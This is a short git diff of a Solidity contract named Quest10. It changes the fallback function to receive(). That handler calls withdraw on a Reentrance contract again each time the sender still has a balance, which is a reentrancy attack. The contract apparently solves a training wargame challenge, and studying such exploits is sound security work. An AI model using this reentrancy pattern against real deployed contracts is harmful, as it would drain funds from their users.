@@ -22,7 +22,7 @@ contract Quest10 is Ownable {
         IReentrance(reentranceAddress).withdraw(_amount);
     }
 
-    fallback() external payable {
+    receive() external payable {
         console.log("Received", msg.value, "from", msg.sender);
         if (address(msg.sender).balance != 0) {
             IReentrance(msg.sender).withdraw(_amount);
